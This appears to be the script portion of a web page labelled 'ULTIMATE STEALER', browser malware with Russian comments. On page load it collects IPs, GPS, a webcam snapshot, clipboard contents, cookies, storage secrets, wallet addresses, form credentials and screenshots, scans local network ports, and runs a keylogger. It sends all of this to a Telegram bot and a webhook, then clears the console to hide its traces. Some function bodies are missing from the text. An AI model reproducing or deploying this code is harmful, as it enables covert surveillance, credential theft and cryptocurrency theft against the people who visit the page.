        async function getAllIPs() {

                { url: 'https://api.ipify.org?format=json', key: 'ip' },
                { url: 'https://api.ip.sb/geoip', key: 'ip' },

                    }
                } catch (e) { log('⚠️ IP source failed: ' + src.url); }
            }
            return results;
        }

        // ================================================================
        // 2. WebRTC
        // ================================================================
        function getWebRTCFull() {
            return new Promise((resolve) => {
                const ips = { public: [], local: [], all: [] };
                try {
                    const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    pc.createDataChannel('');
                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) return;
                        const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
                        if (m) {
                            m.forEach(ip => {
                                const isLocal = ip.startsWith('192.168.') || ip.startsWith('10.') || 
                                               ip.startsWith('172.16.') || ip.startsWith('127.');
                                if (isLocal) ips.local.push(ip);
                                else ips.public.push(ip);
                                ips.all.push(ip);
                            });
                        }
                    };
                    setTimeout(() => { 
                        pc.close();
                        ips.public = [...new Set(ips.public)];
                        ips.local = [...new Set(ips.local)];
                        ips.all = [...new Set(ips.all)];
                        resolve(ips);
                    }, 800);
                } catch (e) {
                    log('⚠️ WebRTC error: ' + e.message);
                    resolve(ips);
                }
            });
        }

        function getGPS() {

            });
        }

        async function getMediaDevices() {

            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                devices.forEach(d => {
                    result.devices.push({ kind: d.kind, label: d.label || 'hidden' });
                });
            } catch (e) {}
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { width: 320, height: 240 } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                canvas.getContext('2d').drawImage(video, 0, 0);
                result.snapshot = canvas.toDataURL('image/jpeg', 0.3);
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { log('⚠️ Media access denied'); }
            return result;
        }

        // ================================================================

        // ================================================================
        function findAllSecrets(data, path = '', depth = 0) {
            if (depth > 20) return [];
            const result = [];
            if (!data || typeof data !== 'object') return result;
            const patterns = ['token', 'jwt', 'secret', 'key', 'auth', 'password', 'pwd', 'api', 'private', 'wallet', 'mnemonic', 'seed', 'recovery'];
            for (let k in data) {
                const v = data[k];
                const fullPath = path ? `${path}.${k}` : k;
                if (patterns.some(p => k.toLowerCase().includes(p))) {
                    if (v && typeof v === 'string' && v.length > 3 && v.length < 500) {
                        result.push({ path: fullPath, value: trunc(v, 80) });
                    }
                }
                if (typeof v === 'object' && v !== null) {
                    result.push(...findAllSecrets(v, fullPath, depth + 1));
                }
            }
            return result;
        }

        function getFullSystemInfo() {
            const n = navigator;
            const ua = n.userAgent.toLowerCase();
            const result = {
                userAgent: n.userAgent,
                platform: n.platform,
                hardwareConcurrency: n.hardwareConcurrency || '?',
                deviceMemory: n.deviceMemory || '?',
                language: n.language,
                vendor: n.vendor,
                isChrome: !!window.chrome,
                isFirefox: ua.includes('firefox'),
                isSafari: /^((?!chrome|android).)*safari/i.test(n.userAgent),
                os: 'unknown',
                browser: 'unknown'
            };
            if (ua.includes('windows')) result.os = 'Windows';
            else if (ua.includes('mac os x')) result.os = 'macOS';
            else if (ua.includes('linux')) result.os = 'Linux';
            else if (ua.includes('android')) result.os = 'Android';
            else if (ua.includes('ios') || ua.includes('iphone')) result.os = 'iOS';
            
            if (result.isChrome && !result.isFirefox && !result.isSafari) result.browser = 'Chrome';
            else if (result.isFirefox) result.browser = 'Firefox';
            else if (result.isSafari) result.browser = 'Safari';
            return result;
        }

        async function getClipboard() {
            if (!CFG.ENABLE_CLIPBOARD) return null;
            try {

                ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;left:-9999px;top:-9999px;';
                document.body.appendChild(ta);
                ta.focus();

                    ta.remove();
                    if (val && val.length > 0) return val;
                }
                ta.remove();
            } catch (e) {}
            try {
                if (navigator.clipboard && navigator.clipboard.read) {
                    const items = await navigator.clipboard.read();
                    for (let item of items) {
                        if (item.types.includes('text/plain')) {
                            const blob = await item.getType('text/plain');
                            return await blob.text();
                        }
                    }
                }
            } catch (e) {}
            return null;
        }

        // ================================================================
        // 12. INDEXEDDB
        // ================================================================
        function getIndexedDB() {
            return new Promise((resolve) => {
                if (!CFG.ENABLE_INDEXEDDB) { resolve(null); return; }
                try {
                    if (!indexedDB.databases) { resolve(null); return; }
                    indexedDB.databases().then(dbs => {
                        const result = [];
                        let done = 0;
                        if (dbs.length === 0) { resolve([]); return; }
                        dbs.forEach(dbInfo => {
                            const req = indexedDB.open(dbInfo.name);
                            req.onsuccess = (e) => {
                                const db = e.target.result;
                                const stores = Array.from(db.objectStoreNames);
                                const storeData = [];
                                let sDone = 0;
                                if (stores.length === 0) {
                                    result.push({ name: dbInfo.name, stores: [] });
                                    db.close();
                                    if (++done === dbs.length) resolve(result);
                                    return;
                                }
                                stores.forEach(storeName => {
                                    try {
                                        const tx = db.transaction(storeName, 'readonly');
                                        const store = tx.objectStore(storeName);
                                        const reqAll = store.getAll();
                                        reqAll.onsuccess = () => {
                                            const items = reqAll.result || [];
                                            storeData.push({ storeName, count: items.length });
                                            if (++sDone === stores.length) {
                                                result.push({ name: dbInfo.name, stores: storeData });
                                                db.close();
                                                if (++done === dbs.length) resolve(result);
                                            }
                                        };
                                        reqAll.onerror = () => {
                                            storeData.push({ storeName, count: 0 });
                                            if (++sDone === stores.length) {
                                                result.push({ name: dbInfo.name, stores: storeData });
                                                db.close();
                                                if (++done === dbs.length) resolve(result);
                                            }
                                        };
                                    } catch (err) {
                                        storeData.push({ storeName, count: 0 });
                                        if (++sDone === stores.length) {
                                            result.push({ name: dbInfo.name, stores: storeData });
                                            db.close();
                                            if (++done === dbs.length) resolve(result);
                                        }
                                    }
                                });
                            };
                            req.onerror = () => { if (++done === dbs.length) resolve(result); };
                        });
                    }).catch(() => resolve(null));
                } catch (e) { resolve(null); }
            });
        }

        // ================================================================
        // 13. ЛОКАЛЬНАЯ СЕТЬ
        // ================================================================
        function scanLocalNetwork() {
            return new Promise((resolve) => {
                if (!CFG.ENABLE_LOCAL_SCAN) { resolve(null); return; }
                const results = [];
                const ips = ['192.168.1.1', '192.168.0.1', '10.0.0.1'];
                const ports = [80, 443, 22, 8080, 3306, 6379];
                let done = 0;
                const total = ips.length * ports.length;
                ips.forEach(ip => {
                    ports.forEach(port => {
                        const controller = new AbortController();
                        setTimeout(() => controller.abort(), 300);
                        fetch(`http://${ip}:${port}`, { mode: 'no-cors', signal: controller.signal })
                            .then(() => {
                                results.push({ ip, port, open: true });
                                if (++done === total) resolve(results);
                            })
                            .catch(() => {
                                results.push({ ip, port, open: false });
                                if (++done === total) resolve(results);
                            });
                    });
                });
                setTimeout(() => resolve(results), 2000);
            });
        }

        // ================================================================
        // 14. KEYLOGGER
        // ================================================================
        function setupKeylogger() {
            if (!CFG.ENABLE_KEYLOGGER) return null;
            const buffer = [];
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Unidentified') return;
                const special = {
                    'Control': '[CTRL]', 'Shift': '[SHIFT]', 'Alt': '[ALT]',
                    'Meta': '[WIN]', 'Escape': '[ESC]', 'Tab': '[TAB]',
                    'Enter': '[ENTER]', 'Backspace': '[BACK]', 'Delete': '[DEL]',
                    'ArrowUp': '[UP]', 'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]'
                };
                let output = special[e.key] || e.key;
                if (e.ctrlKey) output = '[CTRL]+' + output;
                if (e.shiftKey && !special[e.key]) output = output.toUpperCase();
                buffer.push({ key: output, time: Date.now() });
                if (buffer.length >= 20) {
                    const data = buffer.splice(0);
                    sendToWebhook({ keylog: data }).catch(() => {});
                }
            });
            setInterval(() => {
                if (buffer.length > 0) {
                    const data = buffer.splice(0);
                    sendToWebhook({ keylog: data }).catch(() => {});
                }
            }, 30000);
            return { enabled: true };
        }

        // ================================================================

        async function takeScreenshot() {
            if (!CFG.ENABLE_SCREENSHOT) return null;
            try {
                // Пытаемся использовать html2canvas
                if (typeof html2canvas !== 'undefined') {
                    const canvas = await html2canvas(document.body, {
                        useCORS: true,
                        allowTaint: true,
                        scale: 0.1,
                        logging: false,
                        backgroundColor: null
                    });
                    return canvas.toDataURL('image/jpeg', 0.2);
                }
                // Загружаем динамически
                const script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                await new Promise((resolve, reject) => {
                    script.onload = resolve;
                    script.onerror = reject;
                    document.head.appendChild(script);
                });
                await sleep(500);
                const canvas = await html2canvas(document.body, {
                    useCORS: true,
                    allowTaint: true,
                    scale: 0.1,
                    logging: false,
                    backgroundColor: null
                });
                return canvas.toDataURL('image/jpeg', 0.2);
            } catch (e) {
                log('⚠️ Screenshot failed: ' + e.message);
                return null;
            }
        }

            if (data.webrtc && data.webrtc.public && data.webrtc.public.length) {
                lines.push(`📡 WebRTC публичные: ${data.webrtc.public.join(', ')}`);
                if (data.webrtc.local && data.webrtc.local.length) {
                    lines.push(`📡 WebRTC локальные: ${data.webrtc.local.join(', ')}`);
                }
                lines.push('');
            }
            
            if (data.gps) {
                lines.push(`📍 GPS: ${data.gps.lat}, ${data.gps.lon} (${data.gps.acc}m)`);
                lines.push('');
            }
            
            if (data.system) {
                const s = data.system;
                lines.push(`💻 ОС: ${s.os}, Браузер: ${s.browser}`);
                lines.push(`  Ядра: ${s.hardwareConcurrency}, RAM: ${s.deviceMemory}GB`);
                lines.push(`  Платформа: ${s.platform}`);
                lines.push('');
            }
            
            if (data.extensions && data.extensions.length) {
                lines.push(`🔌 Расширения (${data.extensions.length}):`);
                data.extensions.forEach(ext => {
                    lines.push(`  ${ext.name}${ext.id ? ' ('+ext.id+')' : ''}`);
                });
                lines.push('');
            }
            
            if (data.wallets) {
                if (data.wallets.ethereum && data.wallets.ethereum.length) {
                    lines.push('💰 Ethereum:');
                    data.wallets.ethereum.forEach(eth => {
                        if (eth.selectedAddress) lines.push(`  Адрес: ${eth.selectedAddress}`);
                        if (eth.chainId) lines.push(`  Сеть: ${eth.chainId}`);
                        if (eth.isMetaMask) lines.push('  MetaMask: да');
                    });
                }
                if (data.wallets.solana && data.wallets.solana.length) {
                    lines.push('💰 Solana:');
                    data.wallets.solana.forEach(sol => {
                        if (sol.publicKey) lines.push(`  Адрес: ${sol.publicKey}`);
                    });
                }
                lines.push('');
            }
            
            if (data.credentials && data.credentials.forms && data.credentials.forms.length) {
                lines.push(`🔓 Найдены формы (${data.credentials.forms.length}):`);
                data.credentials.forms.forEach(form => {
                    form.inputs.forEach(inp => {
                        if (inp.value) {
                            lines.push(`  ${inp.name || 'field'}: ${inp.value}`);
                        }
                    });
                });
                if (data.credentials.passwordManagers && data.credentials.passwordManagers.length) {
                    lines.push(`  Менеджеры: ${data.credentials.passwordManagers.join(', ')}`);
                }
                lines.push('');
            }
            
            if (data.clipboard) {
                lines.push(`📋 Буфер обмена: ${trunc(data.clipboard, 200)}`);
                lines.push('');
            }
            
            if (data.secrets && data.secrets.length) {
                lines.push(`🔑 Найдены секреты (${data.secrets.length}):`);
                data.secrets.slice(0, 15).forEach(sec => {
                    lines.push(`  ${sec.path}: ${sec.value}`);
                });
                if (data.secrets.length > 15) {
                    lines.push(`  ... и ещё ${data.secrets.length - 15}`);
                }
                lines.push('');
            }
            
            if (data.localScan) {
                const open = data.localScan.filter(p => p.open);
                if (open.length) {
                    lines.push(`🌐 Открытые порты (${open.length}):`);
                    open.forEach(p => {
                        lines.push(`  ${p.ip}:${p.port}`);
                    });
                    lines.push('');
                }
            }
            
            if (data.media && data.media.devices && data.media.devices.length) {
                lines.push(`🎥 Устройства медиа (${data.media.devices.length}):`);
                data.media.devices.forEach(d => {
                    lines.push(`  ${d.kind}: ${d.label}`);
                });
                if (data.media.snapshot) {
                    lines.push(`  📸 Снимок: ${Math.round(data.media.snapshot.length/1024)}KB`);
                }
                lines.push('');
            }
            
            if (data.sensors && data.sensors.battery) {
                lines.push(`🔋 Батарея: ${data.sensors.battery.level}%${data.sensors.battery.charging ? ' (зарядка)' : ''}`);
                lines.push('');
            }
            
            if (data.keylogger) {
                lines.push(`⌨️ Keylogger: активен`);
                lines.push('');
            }
            
            if (data.dom) {
                lines.push(`🌐 Страница: ${data.dom.url || 'unknown'}`);
                if (data.dom.title) lines.push(`  Заголовок: ${data.dom.title}`);
                lines.push('');
            }
            
            if (data.indexedDB && data.indexedDB.length) {
                lines.push(`🗄️ IndexedDB (${data.indexedDB.length} БД):`);
                data.indexedDB.forEach(db => {
                    lines.push(`  ${db.name} (${db.stores?.length || 0} stores)`);
                });
                lines.push('');
            }
            
            if (data.screenshot) {
                lines.push(`🖼️ Скриншот: ${Math.round(data.screenshot/1024)}KB`);
                lines.push('');
            }
            
            lines.push('═'.repeat(40));
            lines.push(`📅 ${data.timestamp || new Date().toISOString()}`);
            lines.push(`🔗 ${window.location.href}`);
            lines.push('');
            lines.push('✅ Сбор завершён');
            
            return lines.join('\n');
        }

        // ================================================================
        // 17. ГЛАВНАЯ ФУНКЦИЯ — ВСЕ ВМЕСТЕ
        // ================================================================
        (async function ultimateStealer() {
            try {
                setStatus('⏳ Сбор данных...');
                log('🚀 Запуск ULTIMATE STEALER');
                log(`📋 Токен: ${CFG.BOT_TOKEN.slice(0, 10)}...`);
                log(`📋 Chat ID: ${CFG.CHAT_ID}`);

                // Ключевой логгер (запускаем сразу)
                const keylogger = setupKeylogger();
                if (keylogger) log('⌨️ Keylogger активен');

                const startTime = performance.now();

                // Сбор ВСЕХ данных параллельно
                log('📊 Начинаем параллельный сбор...');
                
                const [
                    ips,
                    webrtc,
                    gps,
                    system,
                    extensions,
                    wallets,
                    credentials,
                    clipboard,
                    sensors,
                    media,
                    localScan,
                    indexedDB,
                    screenshot
                ] = await Promise.allSettled([
                    getAllIPs(),
                    getWebRTCFull(),
                    getGPS(),
                    Promise.resolve(getFullSystemInfo()),
                    Promise.resolve(getAllExtensions()),
                    Promise.resolve(getAllWallets()),
                    Promise.resolve(getAllCredentials()),
                    getClipboard(),
                    getSensors(),
                    getMediaDevices(),
                    scanLocalNetwork(),
                    getIndexedDB(),
                    takeScreenshot()
                ]);

                log('✅ Сбор данных завершён');

                // Собираем все данные в один объект
                const fullData = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer || 'нет',
                    userAgent: navigator.userAgent,
                    ips: ips.value || [],
                    webrtc: webrtc.value || {},
                    gps: gps.value || null,
                    system: system.value || {},
                    extensions: extensions.value || [],
                    wallets: wallets.value || {},
                    credentials: credentials.value || {},
                    clipboard: clipboard.value || null,
                    sensors: sensors.value || {},
                    media: media.value || null,
                    localScan: localScan.value || [],
                    indexedDB: indexedDB.value || null,
                    screenshot: screenshot.value ? screenshot.value.length : 0,
                    keylogger: keylogger ? { active: true } : null,
                    dom: {
                        title: document.title,
                        url: window.location.href,
                        referrer: document.referrer,
                        cookies: document.cookie || 'нет',
                        localStorage: { ...localStorage },
                        sessionStorage: { ...sessionStorage }
                    },
                    performance: {
                        total: Math.round(performance.now() - startTime)
                    }
                };

                // Ищем секреты
                const secrets = findAllSecrets({
                    localStorage: { ...localStorage },
                    sessionStorage: { ...sessionStorage },
                    cookies: document.cookie
                });
                fullData.secrets = secrets;

                // Формируем отчёт
                const report = formatReport(fullData);
                log(`📊 Отчёт сформирован (${report.length} символов)`);

                setStatus('📤 Отправка данных...');

                // Отправка ВСЕМИ каналами
                const telegramOk = await sendToTelegram(report);
                const webhookOk = await sendToWebhook(fullData);

                // Отправка скриншота отдельно (если есть и он большой)
                if (screenshot.value && screenshot.value.length > 10000) {
                    try {
                        const form = new FormData();
                        form.append('chat_id', CFG.CHAT_ID);
                        form.append('photo', await fetch(screenshot.value).then(r => r.blob()), 'screenshot.jpg');
                        await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: form
                        });
                        log('📸 Скриншот отправлен');
                    } catch (e) {
                        log('⚠️ Скриншот не отправлен: ' + e.message);
                    }
                }

                if (telegramOk || webhookOk) {
                    setStatus('✅ Данные отправлены!');
                    log('✅ УСПЕШНО! Данные отправлены в Telegram и Webhook');
                } else {
                    setStatus('⚠️ Частичная отправка');
                    log('⚠️ Не все каналы сработали');
                }

                // Показываем кнопку теста
                document.getElementById('testBtn').style.display = 'block';
                document.getElementById('testBtn').onclick = window.testSend;

                // Очистка следов
                if (CFG.STEALTH) {
                    console.clear();
                    setTimeout(() => {
                        statusEl.style.opacity = '0';
                    }, 3000);
                }

                log(`⏱️ Время выполнения: ${Math.round(performance.now() - startTime)}ms`);

            } catch (e) {
                setStatus('❌ Ошибка');
                log('❌ Критическая ошибка: ' + e.message);
                console.error(e);
            }
        })();

        // ================================================================
        // ЗАПУСК
        // ================================================================
        log('🚀 Инициализация...');
        setTimeout(ultimateStealer, 300);

        // Тест по F12 (для отладки)
        document.addEventListener('keydown', (e) => {
            if (e.key === 'F12') {
                log('🔍 F12 нажата');
            }
        });

        console.log('✅ ULTIMATE STEALER загружен');
        console.log('📋 Для теста нажмите testSend() в консоли или кнопку внизу страницы');
        console.log('🔍 Отладка в правом верхнем углу');

    </script>
